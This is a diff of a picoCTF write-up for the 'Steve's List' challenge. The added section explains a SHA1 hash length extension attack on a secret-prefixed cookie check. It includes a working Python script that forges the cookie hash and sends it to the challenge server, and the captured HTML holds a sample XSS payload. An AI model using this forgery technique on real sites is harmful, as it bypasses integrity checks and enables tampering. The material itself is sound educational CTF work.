@@ -2,7 +2,7 @@
 
 What a fun challenge! We have a pwned website and we have to figure out how to pwn it as well.
 
-## Recon
+## Hash Length Extension
 Looking at the `steves_list_backup.zip` we see the following files:
 ```
 $ ls
@@ -21,7 +21,7 @@ The first file to note is `cookies.php`:
  21   }
 
 ```
-Lines 19 and 20 show that if the cookie `custom_settings` isn't set aka first visit to the website, then two cookies are set: `custom_settings` and `custom_settings_hash`.
+Lines 19 and 20 show that if the cookie *custom_settings* isn't set aka if it is the user's first visit to the website, then two cookies are set: *custom_settings* and *custom_settings_hash*.
 
 This can be verified in Google Chrome via the developer console (`Right Click -> Inspect Element -> 'Console'`)
 ```
@@ -29,11 +29,73 @@ This can be verified in Google Chrome via the developer console (`Right Click ->
 "custom_settings=b%253A1%253B; custom_settings_hash=2141b332222df459fd212440824a35e63d37ef69"
 ```
 
-Also, because we have the source code, we know what these values mean:
-`custom_settings` - urlencode(serialize(true))
-
-
 Line 5 of the same file is of key importance to us.
+```php
+  4     $custom_settings = urldecode($_COOKIE['custom_settings']);
+  5     $hash = sha1(AUTH_SECRET . $custom_settings);
+  6     if ($hash !== $_COOKIE['custom_settings_hash']) {
+  7       die("Why would you hack Section Chief Steve's site? :(");
+  8     }
+```
+
+Ah! So we are taking the cookie value in _custom_settings_, prepending the _AUTH_SECRET_ and performing a sha1 hash. This screams to us, **LENGTH EXTENSION ATTACK**. For more information, [click here](http://en.wikipedia.org/wiki/Length_extension_attack).
+
+Essentially, if we know the input data, the resulting hash, and the hash type, we can append malicious code to the initial data and receive a hash that will pass the given test. To do the hash calculation, we will utilize [hlextend](https://github.com/stephenbradshaw/hlextend).
+
+To prove this, let's test hlextend.
+```python
+import hlextend
+import requests
+import subprocess
+
+def encode(s):
+    '''Return php urlencoded string'''
+    print "ENCODE: " + s
+    s = s.replace("\x00", "\0")
+    encode_php = "<?php $text = <<<EOD\n{}\nEOD;\necho urlencode($text);\n?>".format(s)
+
+    with open('encode_me.php', 'w') as f:
+        f.write(encode_php)
+
+    output = subprocess.check_output('php encode_me.php', shell=True)
+    return output
+
+url = 'http://steveslist.picoctf.com'
+original_hash = '2141b332222df459fd212440824a35e63d37ef69'
+original_data = 'b:1;'
+appended_data = 'pwned'
+key_length = 8
+
+# Get our new hash for our new data
+sha = hlextend.new('sha1')
+cookie = sha.extend(appended_data, original_data, key_length, original_hash)
+cookie_hash = sha.hexdigest()
+
+# Send a request with our new cookie to verify our method works
+output = encode(cookie)
+cookies = {'custom_settings_hash': cookie_hash,
+           'custom_settings': output}
+print requests.get(url, cookies=cookies).text
+```
+In short, we appended **pwned** to the original data of **b:1;**, ran the new data through *hlextend.py* to receive our new hash, then requested the web page with our new cookie.
+```html
+$ python hlextend_test.py
+<html>
+  <head>
+    <title>Steve's List</title>
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="steves_list.css" />
+    <script src="javascript" src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
+  ...
+  
+  ...
+<!-- POST 0wn3d by D43d4lu5 C0rp: OWNED OWNED OWNED OWNED OWNED OWNED SECTION CHIEF STEVE IS THE WORST<br><img src='./daedalus.png'><br><script>alert(1);</script><marquee>rekt</marquee><br><br><blink>we changed your secret</blink><br><br><marquee><blink>bet you'll never get control of this site back</blink></marquee><br><blink>look at this top quality tag we added</blink> --><!-- POST I'm Section Chief Steve: I'm the best.<br>The very best.<br><img src='./Steve.png'> -->
+```
+Because we see the HTML for the home page, we know that our cookie creation worked. Winning!
+
+Now, what can we do with this new cookie creation?
+
+## Unserialize object creation
 
 ```php
 <?php
@@ -54,3 +116,6 @@ $ser = $post_ser;
 echo $ser;
 ?>
 ```
+
+
+
